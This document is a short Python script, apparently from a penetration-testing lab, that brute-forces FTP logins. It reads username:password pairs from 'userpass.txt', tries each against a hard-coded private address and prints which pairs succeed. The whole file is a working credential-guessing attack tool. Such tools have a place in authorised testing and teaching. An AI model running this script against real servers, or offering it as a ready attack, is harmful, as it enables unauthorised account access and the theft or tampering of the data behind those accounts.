#!/usr/bin/python3
import ftplib


def ftp_check(hostname, username, password):
    try:
        client = ftplib.FTP(hostname)
        client.login(username, password)
        print(f'[+] {hostname}: {username}@{password}')
        client.quit()
        return username, password
    except ftplib.all_errors as e:
        print(f'[-] {hostname}: {username}@{password}')
        return None


def main():
    host = '192.168.100.97'
    with open('userpass.txt', 'r') as f:
        for userpass in f.readlines():
            userpass = userpass.strip('\n').split(':')
            ftp_check(host, userpass[0], userpass[1])
        f.close()


if __name__ == '__main__':
    main()
